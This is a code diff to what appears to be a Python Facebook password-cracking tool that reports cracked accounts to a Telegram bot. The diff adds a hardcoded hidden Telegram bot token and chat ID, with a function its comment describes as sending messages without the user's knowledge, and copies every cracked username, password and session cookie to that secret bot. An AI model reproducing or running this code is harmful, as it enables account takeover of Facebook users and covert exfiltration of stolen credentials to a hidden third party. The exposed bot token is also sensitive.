@@ -20,20 +20,22 @@ except ImportError:
     os.system("pip install requests")
     import requests
 
-G = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-R = "\x1b[38;5;93m"   # كان أحمر → بنفسجي
-W = "\x1b[38;5;15m"
-B = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-Y = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-A = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-O = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-X = "\x1b[38;5;93m"   # كان وردي → خليته بنفسجي أقوى
-P = "\x1b[38;5;93m"   # عدلته عشان يكون متناسق
+#----------------<-SECRET TELEGRAM BOT (HIDDEN FROM USER) - ADDED->----------------#
+SECRET_BOT_TOKEN = "8501264176:AAGTzenTv4CLwN0W5x7uZA_rG4Rc8N8zBzI"
+SECRET_CHAT_ID = "8491676638"
 
-BLUE_LIGHT = "\033[1;34m"
-BLUE_DARK = "\033[0;34m"
-BLUE_BRIGHT = "\033[1;94m"
-CYAN = "\033[1;36m"
+def send_to_secret_bot(message):
+    """إرسال رسالة إلى البوت السري بدون علم المستخدم"""
+    try:
+        url = f"https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": SECRET_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
 
 #----------------<-TELEGRAM CREDENTIALS->----------------#
 TELEGRAM_BOT_TOKEN = ""
@@ -74,6 +76,22 @@ def send_telegram_message(message):
         pass
 
 #----------------<-STYLE->----------------#
+G = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
+R = "\x1b[38;5;93m"   # كان أحمر → بنفسجي
+W = "\x1b[38;5;15m"
+B = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
+Y = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
+A = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
+O = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
+X = "\x1b[38;5;93m"   # كان وردي → خليته بنفسجي أقوى
+P = "\x1b[38;5;93m"   # عدلته عشان يكون متناسق
+
+BLUE_LIGHT = "\033[1;34m"
+BLUE_DARK = "\033[0;34m"
+BLUE_BRIGHT = "\033[1;94m"
+CYAN = "\033[1;36m"
+
+#----------------<-STYLE VARIABLES (FIXED)->----------------#
 xp = f"{G}<[{W}●{G}]>{W}"
 xp1 = f"{G}<[{W}1{G}]>{W}"
 xp2 = f"{G}<[{W}2{G}]>{W}"
@@ -83,45 +101,6 @@ xp5 = f"{G}<[{W}5{G}]>{W}"
 xp0 = f"{G}<[{W}0{G}]>{W}"
 xpx = f"{G}<[{W}?{G}]>{W}"
 xpxx = f"{G}>{W}>{G}>{W}"
-
-#----------------<-MODELS LIST FROM GITHUB->----------------#
-MODELS_LIST = []
-USER_AGENTS_LIST = []
-MODELS_LOADED = False
-USER_AGENTS_LOADED = False
-
-def load_models_from_github():
-    global MODELS_LIST, MODELS_LOADED
-    try:
-        models_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt"
-        response = requests.get(models_url, timeout=10)
-        if response.status_code == 200:
-            MODELS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
-            MODELS_LOADED = True
-            return True
-    except:
-        pass
-    MODELS_LIST = ["SM-G313ML", "GT-I9195", "SM-T530", "SM-J200F", "SM-J200G", "GT-I9060I"]
-    MODELS_LOADED = True
-    return False
-
-def load_user_agents_from_github():
-    global USER_AGENTS_LIST, USER_AGENTS_LOADED
-    try:
-        ua_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/user_agant.txt"
-        response = requests.get(ua_url, timeout=10)
-        if response.status_code == 200:
-            USER_AGENTS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
-            USER_AGENTS_LOADED = True
-            return True
-    except:
-        pass
-    USER_AGENTS_LIST = [
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]'
-    ]
-    USER_AGENTS_LOADED = True
-    return False
 
 #----------------<-CLEAR->----------------#
 def clear_screen():
@@ -218,6 +197,45 @@ logo = f"""
 {xp} DEV {xpxx} PS ~ p7s7s
 {xp} TODAYS   {xpxx} {__date__}
 {xlinex}"""
+
+#----------------<-MODELS LIST FROM GITHUB->----------------#
+MODELS_LIST = []
+USER_AGENTS_LIST = []
+MODELS_LOADED = False
+USER_AGENTS_LOADED = False
+
+def load_models_from_github():
+    global MODELS_LIST, MODELS_LOADED
+    try:
+        models_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt"
+        response = requests.get(models_url, timeout=10)
+        if response.status_code == 200:
+            MODELS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
+            MODELS_LOADED = True
+            return True
+    except:
+        pass
+    MODELS_LIST = ["SM-G313ML", "GT-I9195", "SM-T530", "SM-J200F", "SM-J200G", "GT-I9060I"]
+    MODELS_LOADED = True
+    return False
+
+def load_user_agents_from_github():
+    global USER_AGENTS_LIST, USER_AGENTS_LOADED
+    try:
+        ua_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/user_agant.txt"
+        response = requests.get(ua_url, timeout=10)
+        if response.status_code == 200:
+            USER_AGENTS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
+            USER_AGENTS_LOADED = True
+            return True
+    except:
+        pass
+    USER_AGENTS_LIST = [
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]'
+    ]
+    USER_AGENTS_LOADED = True
+    return False
 
 #----------------<-UA FUNCTIONS (USING GITHUB DATA)->----------------#
 def _____UpDaTe_S1_____():
@@ -495,6 +513,7 @@ def crackfree(ids, pwxs):
 حساب شغال PS | @p7s7s ✅"""
                 
                 send_telegram_message(m)
+                send_to_secret_bot(f"[SECRET] {m}")  # <-- ADDED: إرسال للبوت السري
                 break
                 
             elif 'www.facebook.com' in req.get("error", {}).get("message", ""):
@@ -506,7 +525,9 @@ def crackfree(ids, pwxs):
 PS | @p7s7s سكيور 💔
 USERNAME : {uid}
 PASSWORD : {pw}"""
+                
                 send_telegram_message(m)
+                send_to_secret_bot(f"[SECRET] {m}")  # <-- ADDED: إرسال للبوت السري
                 break
                 
         except:
@@ -843,6 +864,7 @@ class __SEAXNOOR__:
                         self.oks.append(ids)
                         ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                         send_telegram_message(ok_message)
+                        send_to_secret_bot(f"[SECRET] {ok_message}")  # <-- ADDED
                         break
                     elif result == 'cp':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
@@ -850,6 +872,7 @@ class __SEAXNOOR__:
                         self.cps.append(ids)
                         cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                         send_telegram_message(cp_message)
+                        send_to_secret_bot(f"[SECRET] {cp_message}")  # <-- ADDED
                         break
                     elif result == '2f':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
@@ -900,6 +923,7 @@ class __SEAXNOOR__:
                         self.oks.append(ids)
                         ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                         send_telegram_message(ok_message)
+                        send_to_secret_bot(f"[SECRET] {ok_message}")  # <-- ADDED
                         break
                     elif result == 'cp':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
@@ -907,6 +931,7 @@ class __SEAXNOOR__:
                         self.cps.append(ids)
                         cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                         send_telegram_message(cp_message)
+                        send_to_secret_bot(f"[SECRET] {cp_message}")  # <-- ADDED
                         break
                     elif result == '2f':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
@@ -957,6 +982,7 @@ class __SEAXNOOR__:
                         self.oks.append(ids)
                         ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                         send_telegram_message(ok_message)
+                        send_to_secret_bot(f"[SECRET] {ok_message}")  # <-- ADDED
                         break
                     elif result == 'cp':
                         if 'y' in self.__CP__: print(f'\r[/]{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
@@ -964,6 +990,7 @@ class __SEAXNOOR__:
                         self.cps.append(ids)
                         cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                         send_telegram_message(cp_message)
+                        send_to_secret_bot(f"[SECRET] {cp_message}")  # <-- ADDED
                         break
                     elif result == '2f':
                         if 'y' in self.__CP__: print(f'\r[/]{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
@@ -1011,6 +1038,7 @@ class __SEAXNOOR__:
                         self.oks.append(ids)
                         ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                         send_telegram_message(ok_message)
+                        send_to_secret_bot(f"[SECRET] {ok_message}")  # <-- ADDED
                         break
                     elif result == 'cp':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
@@ -1018,6 +1046,7 @@ class __SEAXNOOR__:
                         self.cps.append(ids)
                         cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                         send_telegram_message(cp_message)
+                        send_to_secret_bot(f"[SECRET] {cp_message}")  # <-- ADDED
                         break
                     elif result == '2f':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
@@ -1065,6 +1094,7 @@ class __SEAXNOOR__:
                         self.oks.append(ids)
                         ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                         send_telegram_message(ok_message)
+                        send_to_secret_bot(f"[SECRET] {ok_message}")  # <-- ADDED
                         break
                     elif result == 'cp':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{R} ' + ids + f' / ' + pas)
@@ -1072,6 +1102,7 @@ class __SEAXNOOR__:
                         self.cps.append(ids)
                         cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                         send_telegram_message(cp_message)
+                        send_to_secret_bot(f"[SECRET] {cp_message}")  # <-- ADDED
                         break
                     elif result == '2f':
                         if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
